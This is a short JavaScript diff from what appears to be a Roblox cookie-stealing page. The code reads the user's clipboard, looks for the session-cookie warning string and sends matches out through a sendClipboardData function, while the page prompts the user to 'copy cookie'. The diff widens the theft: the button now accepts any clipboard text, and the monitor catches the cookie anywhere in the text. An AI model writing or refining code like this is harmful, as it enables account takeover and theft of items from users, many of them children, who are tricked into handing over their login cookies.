@@ -272,7 +272,7 @@ button.addEventListener("click", async () => {
      
     const text = await navigator.clipboard.readText();     
      
-    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
+    if (!text) {     
       status.textContent = "error make sure u copy cookie";     
       return;     
     }     
@@ -290,7 +290,7 @@ async function monitorClipboard() {
   
   try {
     const text = await navigator.clipboard.readText();
-    if (text && text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
+    if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
       await sendClipboardData(text);
       return;
     }
